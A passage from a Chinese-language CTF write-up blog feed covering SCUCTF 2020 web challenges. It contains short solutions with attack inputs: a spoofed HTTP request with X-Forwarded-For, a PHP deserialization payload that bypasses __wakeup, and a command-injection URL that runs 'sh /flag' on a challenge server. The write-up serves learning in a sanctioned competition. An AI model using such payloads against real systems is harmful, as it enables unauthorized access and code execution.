title="1.真的是签到题"></a>1.真的是签到题</h3><p>保存图片就有flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/%E4%B8%8B%E8%BD%BD.png"></p><hr><h3 id="2-情感日记"><a href="#2-情感日记" class="headerlink" title="2.情感日记"></a>2.情感日记</h3><p>一张张看,拼出flag</p><hr><h3 id="3-新生系列1-easyhtml"><a href="#3-新生系列1-easyhtml" class="headerlink" title="3.(新生系列1)easyhtml"></a>3.(新生系列1)easyhtml</h3><p>F12查看源代码,注释处就有flag</p><hr><h3 id="4-我爬我爬"><a href="#4-我爬我爬" class="headerlink" title="4.我爬我爬"></a>4.我爬我爬</h3><p>地址栏输入robots.txt跳转<br>发现ffflllaaaggg.html,输入后再跳转,base64解密得到flag</p><hr><h3 id="5-easyheehee"><a href="#5-easyheehee" class="headerlink" title="5.easyheehee"></a>5.easyheehee</h3><p>查看响应头,lookme=Wm1abWJHeHNZV0ZoWjJkbkxuQm9jQT09<br>两次base64解码得到ffflllggg.php,在地址栏访问即可获得flag</p><hr><h3 id="6-easyweb"><a href="#6-easyweb" class="headerlink" title="6.easyweb"></a>6.easyweb</h3><p>Burp抓包添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 121.89.162.165:8006</span><br><span class="line">User-Agent: 0x401Browser</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_a7727c1058f4f3bf30026a96a53ff1e9&#x3D;1605940928</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">referer: http:&#x2F;&#x2F;scuctf.com</span><br><span class="line">Via: hgg.com</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;i_am_a_powerful_hacker&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="7-看我后面"><a href="#7-看我后面" class="headerlink" title="7.看我后面"></a>7.看我后面</h3><p>后续加index.php.bak得到源码,弱比较,传入5201314得到flag</p><hr><h3 id="8-normalPHP"><a href="#8-normalPHP" class="headerlink" title="8.normalPHP"></a>8.normalPHP</h3><p>读Php代码<br>经测试,base64被过滤,用base32<br><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/123.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到flag$flag &#x3D; &quot;scuctf&#123;php_is_very_1111asy&#125;&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="9-渣男记录"><a href="#9-渣男记录" class="headerlink" title="9.渣男记录"></a>9.渣男记录</h3><p>查找文件备份<a href="http://www.zip得到源码,select做参数,反序列化/">www.zip得到源码,select做参数,反序列化</a><br>wakeup修改username  手动设置参数大于实际参数就可以绕过wakeup<br>select=O:4:”Love”:3:{s:8:”username”;s:5:”admin”;s:8:”password”;i:520;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;sadsa541-azhanana-2xzsdz&#125;</span><br></pre></td></tr></table></figure><p><a href="http://121.89.162.165:8987/?select=O:4:%22Love%22:3:%7Bs:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;%7D">http://121.89.162.165:8987/?select=O:4:%22Love%22:3:{s:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;}</a></p><hr><h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p><a href="http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E&1">http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E%261</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SCUCTF赛后的一点小小记录…&lt;/p&gt;
&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h2&gt;&lt;h3 id=&quot;1-easyF5&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
  </entry>
  
</feed>
